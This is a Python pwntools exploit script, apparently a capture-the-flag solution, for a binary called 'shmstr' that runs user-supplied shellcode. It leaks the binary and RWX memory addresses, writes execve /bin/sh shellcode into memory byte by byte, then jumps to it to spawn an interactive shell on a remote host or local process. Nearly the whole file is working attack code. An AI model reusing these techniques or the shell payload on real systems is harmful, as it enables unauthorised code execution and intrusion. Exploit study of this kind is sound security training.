#!/usr/bin/python3

from pwn import *

context.terminal = 'tmux split -h'.split(' ')
context.arch = 'i386'

DWORD_MASK = 0xffffffff

elf = ELF('shmstr')

if args.REMOTE:
    p = remote('151.236.114.211', 17173)
else:
    p = process(elf.path)
    if args.GDB:
        gdb.attach(p, '''
            brva 0x183f
            continue
            ''')

def choose(choice):
    p.sendlineafter(b'> ', str(choice).encode())

def save_sc(sc):
    choose(1)
    p.sendafter(b'shellcode: ', sc)

def view_sc(index):
    choose(2)
    p.sendlineafter(b'idx: ', str(index).encode())

def delete_sc(index):
    choose(3)
    p.sendlineafter(b'idx: ', str(index).encode())

def run_sc(index, argument, from_begin = True):
    if from_begin:
        choose(4)
    p.sendlineafter(b'idx: ', str(index).encode())
    p.sendlineafter(b'argument: ', str(argument).encode())

def get_return():
    p.recvuntil(b'code = ')
    return int(p.recvline().rstrip(), 10) & DWORD_MASK

# 1. Leak binary address

sc = asm('pop eax; push eax') * 3
save_sc(sc)

run_sc(0, 0)
binary_leak = get_return()
binary_addr = binary_leak - 0x1841

log.info(f'binary leak = {hex(binary_leak)}')
log.info(f'binary @ {hex(binary_addr)}')

# 2. Leak rwx section and increase limit value

inc_limit_addr = binary_addr + 0x1734
log.info(f'inc limit @ {hex(inc_limit_addr)}')

delete_sc(0)
sc = asm('pop eax;') + asm('dec eax') * 5
save_sc(sc)

sc = asm('push edx; pop eax') * 3
save_sc(sc)

run_sc(0, inc_limit_addr)
run_sc(1, 0, False)

rwx_addr = get_return()

log.info(f'rwx @ {hex(rwx_addr)}')

# 3. Write shellcode into rwx section

delete_sc(0)
delete_sc(1)

final = b"\x31\xd2\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
base = 0x41

for idx, value in enumerate(final):
    log.info(f'Writing byte #{idx}')
    cmd = 'pop ecx; pop eax; push ecx; xor byte ptr [edx+%d], al' % (base+idx, )
    sc = asm(cmd)
    
    save_sc(sc)

    run_sc(0, value)

    delete_sc(0)

# 4. Spawn a shell

final_addr = rwx_addr + 0x41

sc = asm('pop eax;') + asm('dec eax') * 5
save_sc(sc)

run_sc(0, final_addr)

p.interactive()
